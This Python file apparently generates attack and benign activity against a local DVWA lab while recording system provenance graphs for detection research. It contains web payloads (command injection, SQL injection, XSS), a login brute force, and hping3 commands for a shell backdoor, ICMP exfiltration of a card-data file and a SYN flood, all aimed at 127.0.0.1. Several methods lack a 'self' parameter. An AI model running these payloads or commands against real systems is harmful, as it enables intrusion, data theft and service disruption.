import os
import sys
import argparse
import subprocess
import time
import warnings
from selenium import webdriver
from subprocess import call
import src.flurry.webutil as webutil
from pathlib import Path
from termcolor import colored

import flurryflake
from flurryflake import snowbank
from flurryflake.filters import camflow

warnings.filterwarnings("ignore", category=DeprecationWarning)

#config options
SAVE_TO_DISK = True

class Host():
    def __init__(self, cfg_path=None, disk_path="graphs"):
        self.camflow = snowbank.Snowbank(camflow.W3CFilter())
        self.sysdig = None
        self.driver = webutil.setupDriver()
        self.topic = "provenance/flake/"
        self.output_loc = os.getcwd() + "/output"
        self.graphs = {}
        self.disk_path = disk_path

    def __del__(self):
        self.driver.close()

    def set_topic(self, topic):
        self.topic = topic

    def set_output_location(self, loc):
        self.output_loc = loc

    def start_recording(self, action):
        if self.camflow is not None:
            if "camflow" not in self.graphs:
                camflowGraph = self.camflow.collect_flake(str(action))
                self.camflow.connect_client()
                self.graphs["camflow"] = camflowGraph
            else:
                print("ERROR: recording already in progress.")
        if self.sysdig is not None:
            if "sysdig" not in self.graphs:
                sysdigGraph = self.sysdig.collect_flake(str(action))
                self.sysdig.connect_client()
                self.graphs["sysdig"] = sysdigGraph
            else:
                print("ERROR: recording already in progress.")

    def stop_recording(self):
        if self.camflow is not None:
            self.camflow.disconnect_client()
            if "camflow" in self.graphs:
                self.camflow.finalize(self.graphs["camflow"])
            else:
                print("WARNING: no CamFlow graph recorded to save.")
        if self.sysdig is not None:
            self.sysdig.disconnect_client()
            if "sysdig" in self.graphs:
                self.sysdig.finalize(self.graphs["sysdig"])
            else:
                print("WARNING: no SysDig graph recorded to save.")

    def publish_to_mqtt(self, format):
        if "camflow" in self.graphs:
            print("sending test message...")
            self.camflow.client.publish(self.topic, self.camflow.getFlake(self.graphs["camflow"]).to_json())
        if "sysdig" in self.graphs:
            self.sysdig.client.publish(self.topic, "the test message works!")

    def publish_to_file(self, format):
        if self.graphs:
            print("to file")

    def delete_graphs(self):
        self.graphs = {}

    def commandinjection(self):
        self.driver.get("http://127.0.0.1/vulnerabilities/exec/")

        command_injection_message = "/html/body/div/div[3]/div/div/form/p/input[1]"
        command_injection_submit = "/html/body/div/div[3]/div/div/form/p/input[2]"
        self.driver.find_element_by_xpath(command_injection_message).send_keys("ping 127.0.0.1; pwd")
        self.driver.find_element_by_xpath(command_injection_submit).click()

    def sqlinjection(self):
        self.driver.get("http://127.0.0.1/vulnerabilities/sqli/")
        injection_message = "/html/body/div/div[3]/div/div/form/p/input[1]"
        injection_submit = "/html/body/div/div[3]/div/div/form/p/input[2]"
        self.driver.find_element_by_xpath(injection_message).send_keys("1' or '2' ='2")
        self.driver.find_element_by_xpath(injection_submit).click()

    def xssdom(self):
        self.driver.get("http://127.0.0.1/vulnerabilities/xss_d/?default=English<script>alert(\"hack\");</script>")
        webutil.clearAllAlerts(self.driver)

    def xssstored(self):
        self.driver.get("http://127.0.0.1/vulnerabilities/xss_s/")
        xss_stored_name = "/html/body/div/div[3]/div/div/form/table/tbody/tr[1]/td[2]/input"
        xss_stored_message = "/html/body/div/div[3]/div/div/form/table/tbody/tr[2]/td[2]/textarea"
        xss_stored_submit = "/html/body/div/div[3]/div/div/form/table/tbody/tr[3]/td[2]/input[1]"
        webutil.clearAllAlerts(self.driver)
        # An exception gets thrown somewhere around here if an alert is open
        self.driver.find_element_by_xpath(xss_stored_name).send_keys("Test")
        self.driver.find_element_by_xpath(xss_stored_message).send_keys("<script>alert('This is stored XSS')</script>")
        self.driver.find_element_by_xpath(xss_stored_submit).click()
        webutil.clearAllAlerts(self.driver)

    def xssreflected(self):
        self.driver.get("http://127.0.0.1/vulnerabilities/xss_r/")
        injection_message = "/html/body/div/div[3]/div/div/form/p/input[1]"
        injection_submit = "/html/body/div/div[3]/div/div/form/p/input[2]"
        self.driver.find_element_by_xpath(injection_message).send_keys("Evilyn <script>alert('We hacked you!')</script>")
        self.driver.find_element_by_xpath(injection_submit).click()
        webutil.clearAllAlerts(self.driver)

    def backdoor():
        os.system("sudo hping3 -I lo -9 secret --rand-source | /bin/sh &")
        time.sleep(1)
        os.system("sudo hping3 -R 127.0.0.1 -e secret -E scripts/rec_attack.sh -d 100 -c 1 --rand-source")
        time.sleep(1)
        os.system("sudo killall hping3")

    def bruteforce():
        os.system("./bruteforce.sh")

    def dataexfil():
        os.system("sudo hping3 --file scripts/credit_card_info.txt --data 134 127.0.0.1 --icmp -c 1 --rand-source")

    def synflood():
        os.system("sudo hping3 -c 2000 -S -w 64 -d 120 -p 80 --faster --rand-source 127.0.0.1")

    def custom(script):
        call(str(script))

    def databaseentry(self):
        self.driver.get("http://127.0.0.1/vulnerabilities/sqli/")
        injection_message = "/html/body/div/div[3]/div/div/form/p/input[1]"
        injection_submit = "/html/body/div/div[3]/div/div/form/p/input[2]"
        self.driver.find_element_by_xpath(injection_message).send_keys("1")
        self.driver.find_element_by_xpath(injection_submit).click()

    def commandlineping(self):
        self.driver.get("http://127.0.0.1/vulnerabilities/exec/")
        command_injection_message = "/html/body/div/div[3]/div/div/form/p/input[1]"
        command_injection_submit = "/html/body/div/div[3]/div/div/form/p/input[2]"
        self.driver.find_element_by_xpath(command_injection_message).send_keys("127.0.0.1")
        self.driver.find_element_by_xpath(command_injection_submit).click()

    def messageboard(self):
        self.driver.get("http://127.0.0.1/vulnerabilities/xss_s/")
        xss_stored_name = "/html/body/div/div[3]/div/div/form/table/tbody/tr[1]/td[2]/input"
        xss_stored_message = "/html/body/div/div[3]/div/div/form/table/tbody/tr[2]/td[2]/textarea"
        xss_stored_submit = "/html/body/div/div[3]/div/div/form/table/tbody/tr[3]/td[2]/input[1]"
        webutil.clearAllAlerts(self.driver)
        # An exception gets thrown somewhere around here if an alert is open
        self.driver.find_element_by_xpath(xss_stored_name).send_keys("Test")
        self.driver.find_element_by_xpath(xss_stored_message).send_keys("Hello World!")
        self.driver.find_element_by_xpath(xss_stored_submit).click()
        webutil.clearAllAlerts(self.driver)

    def pagequery(self):
        self.driver.get("http://127.0.0.1/vulnerabilities/xss_d")

    def questionnaire(self):
        self.driver.get("http://127.0.0.1/vulnerabilities/xss_r/")
        injection_message = "/html/body/div/div[3]/div/div/form/p/input[1]"
        injection_submit = "/html/body/div/div[3]/div/div/form/p/input[2]"
        self.driver.find_element_by_xpath(injection_message).send_keys("Alice")
        self.driver.find_element_by_xpath(injection_submit).click()

    def singlelogin(self):
        self.driver.get("http://127.0.0.1/vulnerabilities/brute")

        user_path = "/html/body/div/div[3]/div/div/form/input[1]"
        pass_path = "/html/body/div/div[3]/div/div/form/input[2]"
        submit_path = "/html/body/div/div[3]/div/div/form/input[3]"

        # My automatic login script isn't good at remembering things. Don't be too harsh on him.
        self.driver.find_element_by_xpath(user_path).send_keys("admin")
        self.driver.find_element_by_xpath(pass_path).send_keys("Password.")
        self.driver.find_element_by_xpath(submit_path).click()
        self.driver.find_element_by_xpath(user_path).send_keys("admin")
        self.driver.find_element_by_xpath(pass_path).send_keys("adminpassword")
        self.driver.find_element_by_xpath(submit_path).click()
        self.driver.find_element_by_xpath(user_path).send_keys("admin")
        self.driver.find_element_by_xpath(pass_path).send_keys("password")
        self.driver.find_element_by_xpath(submit_path).click()

    def fileread():
        os.system("cat scripts/credit_card_info.txt")

    def localexec():
        os.system("sudo ./scripts/rec_benign.sh")

    def ping():
        os.system("ping -c 10 127.0.0.1")
